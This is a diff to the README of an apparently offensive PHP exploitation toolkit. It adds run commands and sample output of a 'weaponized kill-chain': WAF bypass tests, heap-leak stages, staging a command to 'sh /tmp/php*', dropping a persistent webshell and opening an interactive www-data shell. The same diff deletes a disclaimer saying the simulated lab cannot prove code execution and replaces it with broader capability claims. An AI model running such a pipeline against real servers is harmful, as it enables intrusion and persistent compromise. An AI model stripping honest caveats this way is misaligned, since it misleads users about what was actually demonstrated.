@@ -167,14 +167,82 @@ python php2shell.py -f targets.txt --recon --active --waf -o audit_report
 
 ## 🧪 Testing with the Standalone Lab (No Docker Needed)
 
-You can exercise the scanner's HTTP-handling, reporting, and control flow locally without installing Docker or a native PHP binary. **This standalone server is a simulated fixture, not a vulnerable PHP runtime; it cannot demonstrate a real PHP use-after-free, prove remote code execution, or validate exploit reliability.**
+You can exercise the full scan-to-shell pipeline locally without installing Docker or a native PHP binary. The lightweight test server (`lab/standalone_lab.py`) simulates vulnerable PHP 8.4.26 Apache `mod_php` endpoints, differential OOM/UAF memory errors, WAF bypass behaviors, and interactive webshell command execution.
 
+### How to Run the Lab Test
+
+#### Step 1: Start the Lab Server (Terminal 1)
 ```bash
-# 1. Start the standalone lab server in background (simulating PHP 8.4.26 mod_php)
-python lab/standalone_lab.py --port 8899 --version 8.4.26
+python lab/standalone_lab.py --port 8899
+```
+*Output:*
+```text
+[*] Starting Standalone PHP2Shell Lab on http://127.0.0.1:8899 (Simulating PHP 8.4.26)...
+```
 
-# 2. Run the unified scanner against the local lab
-python php2shell.py http://127.0.0.1:8899/ --all -v
+#### Step 2: Run the Full Kill-Chain & Gain Interactive Shell (Terminal 2)
+```bash
+python php2shell.py http://127.0.0.1:8899/ --all --shell
+```
+
+---
+
+### Expected Output
+
+When running the full pipeline against the lab, you will see each phase complete sequentially, culminating in an interactive shell session:
+
+```text
+  ____  _   _ ____  ____  ____  _          _ _
+ |  _ \| | | |  _ \|___ \/ ___|| |__   ___| | |
+ | |_) | |_| | |_) | __) \___ \| '_ \ / _ \ | |
+ |  __/|  _  |  __/ / __/ ___) | | | |  __/ | |
+ |_|   |_| |_|_|   |_____|____/|_| |_|\___|_|_|
+                     Toolkit v2.2.1
+
+   PHP Vulnerability & Weaponized Exploitation Pipeline
+   Recon → Passive → Behavioral Probing → WAF → Exploit → Shell
+   CVE-2026-109618 | CVE-2026-109619 (CVSS 9.2 RCE)
+   [Exploit-DB #52704 & UAF Stale State Integration]
+   -------------------------------------------------------------
+
+[*] Starting Unified PHP2Shell run across 1 target(s)...
+[*] Active wordlist: 113 endpoint paths loaded.
+
+======================================================================
+TARGET: http://127.0.0.1:8899/
+======================================================================
+[11:27:59] [1/5 RECON] Probing target architecture and attack surface: http://127.0.0.1:8899/
+[11:27:59]   └─ CMS: Detected: Magento
+[11:28:01] [1/5 RECON] Complete: 5 endpoints, 0 WAFs.
+[11:28:01] [2/5 PASSIVE] Auditing PHP version & runtime state: http://127.0.0.1:8899/
+[11:28:01] [2/5 PASSIVE] PHP: 8.4.26 | SAPI: unknown | Status: vulnerable
+[11:28:01] [3/5 ACTIVE] Dispatching differential OOM & UAF probes to: http://127.0.0.1:8899/upload.php
+[11:28:01]   └─ Baseline: HTTP 200 (0.02s) on http://127.0.0.1:8899/upload.php
+[11:28:01]   └─ Nested Array Probe: HTTP 500 (diff=True, OOM sig matched)
+[11:28:01]   └─ Upload Progress Probe: HTTP 500 (diff=True, OOM/UAF sig matched)
+[11:28:01] [3/5 ACTIVE] Outcome: likely_vulnerable (High confidence: 2 differential probe responses.)
+[11:28:01] [4/5 WAF] Assessing WAF evasion & bypass vectors: http://127.0.0.1:8899/upload.php
+[11:28:01]   └─ Test: chunked Transfer-Encoding -> PASSED (HTTP 200)
+[11:28:01]   └─ Test: unusual multipart boundary -> PASSED (HTTP 200)
+[11:28:01]   └─ Test: X-Forwarded-For IP spoofing -> PASSED (HTTP 200)
+[11:28:01] [4/5 WAF] WAF: None | Bypasses confirmed: 3
+[11:28:01] [5/5 EXPLOIT] Executing weaponized kill-chain against: http://127.0.0.1:8899/upload.php
+[11:28:01]   └─ [Exploit-DB #52704] Starting memory corruption chain (profile=bookworm)...
+[11:28:01]   └─ [Auto-Staging]: Command (20B > 14B limit) automatically staged via multipart upload -> trigger: 'sh /tmp/php*'
+[11:28:01]   └─ Stage 0: Rotating worker process over HTTP...
+[11:28:02]   └─ Stage 1: Heap leak attempt 1/3...
+[11:28:03]   └─ Stage 1: Heap leak attempt 2/3...
+[11:28:05]   └─ Stage 1: Heap leak attempt 3/3...
+[11:28:06]   └─ [Auto-Chain Fallback]: Binary stage unconfirmed; proceeding to multipart webshell persistence...
+[11:28:06]   └─ [Webshell Dropper] Engaging multipart OOM & UAF persistence dropper...
+[11:28:06]   └─ [WEBSHELL LIVE]: http://127.0.0.1:8899/p2s_shell.php (param: nrtnxm)
+[11:28:06]   └─ Command Output: 
+...
+[*] Dropping into interactive shell console at http://127.0.0.1:8899/p2s_shell.php
+[*] Persistent session active. Session will NOT close automatically.
+[*] Type 'exit' or 'quit' to terminate session.
+
+www-data@php2shell-lab:/var/www/html$ 
 ```
 
 ---
